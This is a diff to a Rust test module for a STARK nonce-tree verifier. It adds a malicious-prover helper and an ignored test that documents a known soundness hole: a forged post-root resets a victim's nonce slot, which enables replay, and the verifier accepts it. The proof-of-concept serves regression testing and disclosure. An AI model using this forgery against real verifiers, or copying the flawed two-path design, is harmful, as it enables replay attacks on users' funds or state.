@@ -517,6 +517,113 @@ mod tests {
         (st, ts)
     }
 
+    // ── A malicious prover: per-path siblings chosen freely ───────────────────
+    //
+    // `prove_nonce_transitions` gives a link's old and new paths the SAME
+    // siblings because it builds the witness that way. The question is whether
+    // the VERIFIER requires it. This prover is identical except that it takes
+    // the siblings per path, which is what an adversary writing their own prover
+    // controls.
+    fn prove_with_free_siblings(
+        st: &NonceStatement,
+        sibs: &[Vec<[u64; 4]>],
+        bits: &[Vec<bool>],
+    ) -> (Vec<u8>, u32) {
+        let log_size = statement_log_size(st).unwrap();
+        let (leaves, indices, roots, depths) = st.pinned_paths();
+        let (main_cols, reached) = merkle::build_trace_multi(&leaves, sibs, bits, log_size);
+        assert_eq!(reached, roots, "test setup: each path must reach its pinned root");
+        let preproc =
+            merkle::build_preproc_multi_var(&leaves, &indices, &roots, &depths, log_size);
+
+        let config = make_config(log_size);
+        let twiddles = CpuBackend::precompute_twiddles(
+            CanonicCoset::new(log_size + LOG_BLOWUP + 1).circle_domain().half_coset,
+        );
+        let channel = &mut Blake2sM31Channel::default();
+        let mut scheme =
+            CommitmentSchemeProver::<CpuBackend, Blake2sM31MerkleChannel>::new(config, &twiddles);
+        scheme.set_store_polynomials_coefficients();
+        let mut tree = scheme.tree_builder();
+        tree.extend_evals(preproc);
+        tree.commit(channel);
+        let mut tree = scheme.tree_builder();
+        tree.extend_evals(main_cols);
+        tree.commit(channel);
+        mix_statement(channel, st);
+        let component = merkle::new_component(log_size);
+        let proof =
+            prove::<CpuBackend, Blake2sM31MerkleChannel>(&[&component], channel, scheme).unwrap();
+        (bincode::serde::encode_to_vec(&proof, bincode::config::standard()).unwrap(), log_size)
+    }
+
+    /// KNOWN HOLE (2026-10-08) — this test asserts the CURRENT, VULNERABLE
+    /// behaviour so the defect is executable rather than prose. When the fix
+    /// lands (a component that ties a link's two paths to ONE sibling set), the
+    /// final assertion flips and the name loses its prefix.
+    ///
+    /// The attack: victim V has already used nonces up to 5. Sender A advances
+    /// 0 -> 1, and the update declares as its post-root a tree in which A's slot
+    /// is honestly 1 — but V's slot is RESET to 0. The old path authenticates
+    /// against the real pre-root with real siblings; the new path authenticates
+    /// against the forged post-root with DIFFERENT siblings. Every public check
+    /// holds: the nonce increases, the slot is A's, the chain ends at new_root.
+    /// In the next batch V's already-used nonces are valid again: replay.
+    ///
+    /// The off-circuit reference `nonce_tree::verify_transition` is NOT fooled —
+    /// `NonceTransition` has one `sibs` field for both paths. The circuit has
+    /// two independent paths. Agreement between the prover and the circuit
+    /// showed nothing about whether either enforced the property.
+    #[test]
+    #[ignore = "STARK proving; documents an open soundness hole (TECH_DEBT A-4)"]
+    fn known_hole_verifier_accepts_a_post_root_that_resets_another_slot() {
+        let a = sender(1);
+        let v = sender(2);
+        let slot_a = crate::nonce_tree::slot_index(&a, D).unwrap();
+        let slot_v = crate::nonce_tree::slot_index(&v, D).unwrap();
+        assert_ne!(slot_a, slot_v, "setup: A and V must own different slots");
+
+        // The real state: V at 5, A unseen.
+        let mut real = NonceTree::new(D).unwrap();
+        real.set(slot_v, 5).unwrap();
+        let (old_sibs, bits) = real.membership_proof(slot_a).unwrap();
+
+        // The forged post-state: A at 1 — and V silently back at 0.
+        let mut forged = NonceTree::new(D).unwrap();
+        forged.set(slot_a, 1).unwrap();
+        let (new_sibs, new_bits) = forged.membership_proof(slot_a).unwrap();
+        assert_eq!(bits, new_bits, "same slot, same direction bits");
+        assert_ne!(old_sibs, new_sibs, "the forgery needs different siblings");
+        assert_eq!(forged.get(slot_v), 0, "V's slot was reset");
+
+        let st = NonceStatement {
+            old_root: p2t8_node_words(&real.root()),
+            new_root: p2t8_node_words(&forged.root()),
+            updates: vec![NonceUpdate {
+                index: slot_a,
+                old_nonce: 0,
+                new_nonce: 1,
+                post_root: p2t8_node_words(&forged.root()),
+            }],
+            depth: D,
+        };
+        assert_eq!(st.check_public(), None, "every public check passes");
+
+        let w = |s: &[[u8; 32]]| -> Vec<[u64; 4]> { s.iter().map(p2t8_node_words).collect() };
+        let (proof, log_size) = prove_with_free_siblings(
+            &st,
+            &[w(&old_sibs), w(&new_sibs)],
+            &[bits.clone(), bits],
+        );
+
+        // CURRENT behaviour: accepted. This is the hole.
+        assert!(
+            verify_nonce_transitions(&proof, log_size, &st).unwrap(),
+            "if this fails, the verifier now rejects the forgery — the hole is \
+             closed: invert this assertion and drop the KNOWN_HOLE prefix"
+        );
+    }
+
     // ── The public gate, which needs no proof ────────────────────────────────
 
     #[test]
